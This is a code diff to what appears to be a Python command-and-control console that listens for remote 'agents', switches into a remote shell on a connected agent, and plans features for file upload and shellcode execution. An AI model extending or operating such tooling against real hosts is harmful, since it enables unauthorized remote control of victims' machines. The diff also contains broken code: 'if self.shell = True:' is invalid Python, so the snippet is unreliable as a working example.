@@ -27,7 +27,9 @@ import inspect
 
 # TODO:
 #   - verification if agent is alive?
-#   - help messages of Cmd
+#   - kill agent
+#   - correct exit from shell
+#   [DONE] help messages of Cmd 
 #   - add HTTP transport
 #   - use commands (getpid, upload file, exec shellcode) and cmd.exe only if 'shell' entered
 
@@ -39,6 +41,7 @@ def main():
 class Terminal(Cmd):
     def __init__(self,Listeners,ClientDict):
         Cmd.__init__(self)
+        self.shell = False
         self.lport = 8008
         self.lhost = "0.0.0.0"
         self.listeners = Listeners
@@ -68,23 +71,36 @@ class Terminal(Cmd):
             self.help_interact()
         else:
             self.q.put("shell\n")
+            self.parentagent = self.agent
+            self.shell = True
             # For now shell is implemented in separate connection in agents
             # Sleep while shell connection is created
-            time.sleep(3)
+            time.sleep(1)
             print("[DBG] Getting new connection queue...")
             # Parsing last agent ID
-            self.shellagent = list(self.ClientDict.keys())[-1]
+            self.agent = list(self.ClientDict.keys())[-1]
 
             # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
-            print("[DBG] Shell Agent ID: {} and data:".format(self.shellagent))
-            print("{}".format(self.ClientDict[self.shellagent]))
-            self.do_interact(self.shellagent)
-            self.prompt = '{} > '.format(self.ClientDict[self.shellagent][0][0])
+            print("[DBG] Shell Agent ID: {} and data:".format(self.agent))
+            print("{}".format(self.ClientDict[self.agent]))
+            self.do_interact(self.agent)
+            self.prompt = '{} shell> '.format(self.ClientDict[self.agent][0][0])
             
+    def do_back(self,args):
+        if self.shell = True:
+            self.q.put("exit\n")
+            self.do_interact(self.parentagent)
+        else:
+            self.q = None
+            self.prompt = '$ '
 
     def do_exit(self,args):
-        time.sleep(0.5)
-        os._exit(0)
+        if self.shell = True:
+            self.q.put("exit\n")
+            self.do_interact(self.parentagent)
+        else:
+            time.sleep(0.5)
+            os._exit(0)
 
     def do_start(self,args):
         if len(args.split(' ')) != 2:
@@ -177,9 +193,6 @@ class Terminal(Cmd):
         print("interact <agent_id>")
         print("To view available agents, use: list agents")
 
-    def do_back(self,args):
-        self.q = None
-        self.prompt = '$ '
     
 
 
